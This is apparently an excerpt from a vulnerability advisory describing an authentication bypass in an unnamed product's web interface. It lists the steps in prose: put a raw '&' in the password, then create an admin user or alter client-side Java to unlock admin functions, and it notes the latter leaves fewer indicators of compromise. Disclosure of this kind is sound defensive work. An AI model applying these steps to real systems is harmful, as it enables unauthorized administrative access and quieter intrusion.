[-] Vulnerability Details:
==========================
The process to bypass authentication and escalate privileges is as follows:
 
One:
Include the "&" symbol anywhere in the password value in the login
request (as raw content - it must not be encoded).
 
Two:
After a moment, the system will accept those credentials and grant
access to the GUI. The account appears somewhat restricted - but this
is only client side.
 
Three:
Send a request to add a new administrative user.
 
Four:
The new admin account is then available for use as created above.
 
Note: As an alternative, it is trivial to modify the Java code on it&#039;s
way down to a browser to enable all of the admin functions rather than
creating a new user.
This worked as well - so it&#039;s not strictly necessary to create a new
user; the bypass &#039;user&#039; has full admin access if needed (leaving less
indicators of compromise)
